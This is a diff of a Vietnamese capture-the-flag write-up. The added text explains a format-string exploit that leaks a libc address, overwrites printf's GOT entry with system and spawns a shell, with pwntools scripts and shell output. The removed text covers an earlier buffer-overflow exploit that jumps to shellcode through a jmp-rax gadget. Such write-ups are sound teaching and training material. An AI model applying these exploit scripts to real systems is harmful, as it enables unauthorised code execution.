@@ -52,7 +52,7 @@ undefined8 main(void)
 
 ```
 
-À há, đúng như dự định. Bài toán này có lỗ hổng Format String, kết hợp với Checksec chỉ bật `Partial Relro`, ý tưởng là như sau: Thay thế GOT của hàm `printf` thành `system` và tiến hành gọi `/bin/sh`. Hàm `printf` nhận đầu vào `input` và đưa vào thanh ghi `rdi`, từ đó ta có thể nhập chuỗi `/bin/sh` vào và chuỗi đó sẽ được đưa vào thanh ghi `rdi`. Lần sau khi gọi `printf` thì nó sẽ gọi `system('/bin/sh')`. Nhưng, có 1 vấn đề rất lớn mà chúng ta phải đối mặt, biến i được khai báo với giá trị là 0, nhưng vòng while chỉ thực hiện khi `(i != 0)`, nói cách khác. Vòng lặp này chỉ thực hiện 1 lần, cho nên việc mà ta có thể vừa `leak` địa chỉ, vừa `overwrite` GOT của hàm `printf` là không thể. Đó là lúc chúng ta cần phải nghĩ theo 1 hướng: đó là thay đổi giá trị biến `i` sao cho nó khác 0, từ đó tạo ra vòng lặp vô hạn -> từ đây thì có rất nhiều cách để khai thác rồi. Cùng debug để xem nào.
+À há, đúng như dự đoán, bài toán này có lỗ hổng Format String, kết hợp với Checksec chỉ bật `Partial Relro`, ý tưởng là như sau: Thay thế GOT của hàm `printf` thành `system` và tiến hành gọi `/bin/sh`. Hàm `printf` nhận đầu vào `input` và đưa vào thanh ghi `rdi`, từ đó ta có thể nhập chuỗi `/bin/sh` vào và chuỗi đó sẽ được đưa vào thanh ghi `rdi`. Lần sau khi gọi `printf` thì nó sẽ gọi `system('/bin/sh')`. Nhưng, có 1 vấn đề rất lớn mà chúng ta phải đối mặt, biến i được khai báo với giá trị là 0, nhưng vòng while chỉ thực hiện khi `(i != 0)`, nói cách khác. Vòng lặp này chỉ thực hiện 1 lần, cho nên việc mà ta có thể vừa `leak` địa chỉ, vừa `overwrite` GOT của hàm `printf` là không thể. Đó là lúc chúng ta cần phải nghĩ theo 1 hướng: đó là thay đổi giá trị biến `i` sao cho nó khác 0, từ đó tạo ra vòng lặp vô hạn -> từ đây thì có rất nhiều cách để khai thác rồi. Cùng debug để xem nào.
 
 ```
 
@@ -286,128 +286,105 @@ pwndbg> p/d (0x7fffffffda18 - 0x7fffffffd860) /8 + 6
 $2 = 61
 ```
 
-Vậy offset ta cần leak là 61, sau đó ta lấy địa chỉ được leak trừ cho offset của libc_start_main là ổn
+Vậy offset ta cần leak là 61, sau đó ta lấy địa chỉ được leak trừ cho offset của libc_start_main, muốn biết được offset của libc_start_main thì ta sử dụng `vmmap` để kiểm tra địa chỉ libc base, lấy địa chỉ vừa leak được - cho libc base ra được offset. Sau thì ta lại lấy địa chỉ vừa leak được - cho offset vừa tìm thấy là sẽ có được libc base. Sau đó là việc ghi đè GOT cũng sử dụng format string thôi.
+
+```
+libc.address = int(p.recvline()[:-1], 16) -  0x25d4c
+info(f'Libc base: %#x', libc.address)
+print_address = e.got['printf']
+system = libc.address + 0x50f10
+info("Printf address: %#x", print_address)
+info("SYstem address: %#x", system)
+
+
+```
+
+Ta cần tìm địa chỉ system để sau gọi `system('/bin/sh')`. Muốn có được offset của system thì có thể lấy địa chỉ system trên stack hiện tại - cho libc hiện.
+
+```
+pwndbg> p &system
+$3 = (<text variable, no debug info> *) 0x7ffff7e25f10 <system>
+pwndbg> p/x 0x7ffff7e25f10 - 0x7ffff7dd5000
+$4 = 0x50f10
+```
+
+Và ta cũng cần thêm GOT của `printf`, để ghi đè địa chỉ `printf` thành `system`.
+
+```
+
+pwndbg> p &printf
+[0x404000] printf@GLIBC_2.2.5 -> 0x7ffff7e2cc40 (printf) ◂— endbr64
+$3 = (<text variable, no debug info> *) 0x7ffff7e25f10 <system>
+```
+
+Ta thấy 2 byte cuối của printf khác 2 byte cuối của system. Nhưng để cho chắc chắn, hãy thay 3 byte cuối. Vì vậy, cần phải tách ra 2 lần ghi đè, lần 1 ghi đè vào
+`printf`, lần 2 là vào địa chỉ `printf + 1`. Để xử lý dễ dàng hơn nữa, lần thứ 1 ta nên ghi đè 1 byte cuối, trong khi lần 2 ta sẽ ghi 2 byte. Và cách ghi đè byte này sẽ sử dụng lần lượt là `%hhn%` (ghi 1 byte) và `%hn` (ghi 2 byte). Cuối cùng là offset để ta ghi payload vào, để
+kiểm tra xem đầu vào của ta ở offset nào trên stack, ta cũng tiếp tục tận dụng Format string bug:
+
+```
+AAAAAAA%p %p %p %p %p %p %p %p %p
+AAAAAAA0x7fffffffd860 0xff 0x7ffff7edd981 (nil) 0x7ffff7fcdf40 0x2541414141414141 0x2070252070252070 0x7025207025207025 0x2520702520702520
+```
+
+Đếm thì nó ở vị trí số 6, để cho chắc ăn thì ta dời nó đi 4 offset nữa (mỗi offset gồm 8 bytes, nên ta sẽ dời đi 0x20 - 32 bytes). Lý do cho việc này là để chắc chắn rằng việc
+căn chỉnh stack là hợp lý, chúng ta đặt đúng địa chỉ `printf` lên stack. Nên ta sẽ có địa chỉ `printf` ở vị trí 10, và `printf + 1` ở vị trí 11. Xong hết rồi, tiến hành viết script thôiii..
 
 # EXPLOITATION
 
-````
-
-                             **************************************************************
-                             *                          FUNCTION                          *
-                             **************************************************************
-                             undefined follow()
-             undefined         AL:1           <RETURN>
-             undefined1[112]   Stack[-0x78]   buffer                                  XREF[1]:     00101171(*)
-                             follow                                          XREF[4]:     Entry Point(*), main:0010122e(c),
-                                                                                          0010205c, 001020d0(*)
-        00101169 55              PUSH       RBP
-
 ```
-
-Ta thấy rằng từ buffer ta nhập vào đến return address thì cần `0x78` bytes, ta chỉ cần đẩy vào `0x78` bytes padding là sẽ tới được địa chỉ trả về, nhưng trả về cái gì đây... Cứ thử trước đã:
-Nhập vào 0x78 byte padding, breakpoint tại `ret` của hàm `follow` và xem trên `gdb.attach` xem các giá trị thanh ghi nhé:
-
-```
-
-Breakpoint 1, 0x0000560e5f5ce17f in follow () at warmup.c:11
-warning: 11 warmup.c: No such file or directory
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
-*RAX 0x7ffd883884a0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-*RBX 0x7ffd88388638 —▸ 0x7ffd88389ed7 ◂— './white*rabbit'
-\*RCX 0x7fd4029ff8e0 (\_IO_2_1_stdin*) ◂— 0xfbad208b
-*RDX 0
-*RDI 0x7fd402a01720 (_IO_stdfile_0_lock) ◂— 0
-RSI 0x7fd4029ff963 (\_IO_2_1_stdin_+131) ◂— 0xa01720000000000a /_ '\n' _/
-*R8 0
-*R9 0
-R10 3
-R11 0x246
-*R12 0
-*R13 0x7ffd88388648 —▸ 0x7ffd88389ee6 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
-R14 0x7fd402a5d000 (\_rtld_global) —▸ 0x7fd402a5e2e0 —▸ 0x560e5f5cd000 ◂— 0x10102464c457f
-R15 0x560e5f5d0dd8 —▸ 0x560e5f5ce110 ◂— endbr64
-*RBP 0x4141414141414141 ('AAAAAAAA')
-*RSP 0x7ffd88388518 —▸ 0x560e5f5ce200 (main+128) ◂— 0x8d48c68948ffffff
-\*RIP 0x560e5f5ce17f (follow+22) ◂— ret
-──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
-► 0x560e5f5ce17f <follow+22> ret <main+128>
-↓
-
-```
-
-Cái chuỗi padding tôi nhập vào là 120 kí tự A, và nhìn xem, những kí tự đó đã vào trong thanh ghi `RAX`, vậy có nghĩa là nếu chúng ta có thể nhảy về `RAX` thì ta có thể đặt shellcode tại đó -> chương trình
-thực hiện đoạn shellcode là xong. Vậy ý tưởng ban đầu là ta cần tìm 1 cái gadget liên quan đến `call rax` hoặc `jump rax`, sử dụng ROPgadget để tìm nào.
-
-```
-
-0x00000000000010bf : jmp rax
-
-```
-
-Ta đã tìm được nó, nhưng cái này chỉ là offset, đó là lý do ta cần phải có được binary base, rồi lấy `binary base + offset` thì ra địa chỉ thực tế của nó.
-
-```
-
-(\_/)
-( •\_•)
-/ > 0x555555555180
-
-follow the white rabbit...
-
-```
-
-Nhưng trước hết ta cần lấy được địa chỉ main và lưu nó vào 1 biến đã, vì từ đó mới có binary base và leak được cái gadget kia. Tiếp theo, ta chuẩn bị shellcode thôi. Trong thư viện
-`pwntools` có lệnh shellcraft.sh() để tạo nên shellcode, tôi đã dùng nó
-
-```
-
-shellcode = shellcraft.sh()
-
-```
-
-Mọi thứ đã chuẩn bị xong, giờ thì thử viết script và chạy thôii
-
-```
-
 from pwn import \*
 
-p = process('./white_rabbit')
-e = ELF('./white_rabbit')
-context.arch='amd64'
+e = ELF('./yet_another_fsb_patched')
+libc = ELF('./libc.so.6')
 
-# gdb.attach(p, api=True)
+# Stage 1: overwrite last byte for while index
 
-shellcode = asm(shellcraft.sh())
+while True:
+try:
+p = process('./yet_another_fsb_patched') # p = remote(HOST, 443, ssl=True, sni=HOST)
+payload = b'%c%7$hhn\xae'
+        # gdb.attach(p, api=True)
+        p.send(payload)
+        p.recv(7)
+        p.sendline(b'%61$p')
+break
+except EOFError:
+p.close()
 
-p.recvuntil(b'> ')
-main = int(p.recvn(14), 16)
-base_binary = main - e.sym['main']
-info("BASE BINARY: %#x", base_binary)
-jump_rax = base_binary + 0x00000000000010bf
+libc.address = int(p.recvline()[:-1], 16) - 0x25d4c
+info(f'Libc base: %#x', libc.address)
+print_address = e.got['printf']
+system = libc.address + 0x50f10
+info("Printf address: %#x", print_address)
+info("SYstem address: %#x", system)
 
-# payload = sub_rsp
+# Stage 2: overwrite GOT of printF to system
 
-payload = shellcode
-payload += b'A' \* (120 - len(shellcode))
-payload += p64(jump_rax)
-p.recvuntil(b'follow the white rabbit...\n')
+part1 = libc.sym['system'] & 0xff
+part2 = (libc.sym['system'] >> 8) & 0xffff
+info("Part 1: %#x", part1)
+info("pART 2: %#x", part2)
+payload = f'%{part1}c%10$hhn'.encode()
+payload += f'%{part2 - part1}c%11$hn'.encode()
+gdb.attach((p))
+payload = payload.ljust(0x20, b'A')
+payload += p64(e.got['printf'])
+payload += p64(e.got['printf'] + 1)
+
 p.sendline(payload)
+
+p.sendline(b'/bin/sh\0')
 
 p.interactive()
 
 ```
 
-Ta đặt shellcode ngay đầu `rax`, để khi nhảy lại tới `rax` thì sẽ thực thi luôn shellcode. Vậy là ta đã có được shell.
+Sau đó là ta sẽ lấy được flag, khi chạy bị lỗi thì cứ tiến hành chạy lại đến khi nào được thôi (tỉ lệ là 1/16 >.<)
 
 ```
-
-[*] BASE BINARY: 0x56325b5bc000
-[*] Switching to interactive mode
+cat: flag: No such file or directory
+sh: 2: hn%16703c%11: not found
 $ cat flag.txt
-ZAWARUDO$
-
+u GOt the flagsh: 2: 6703c%11: not found
+$
 ```
-
-```
-````
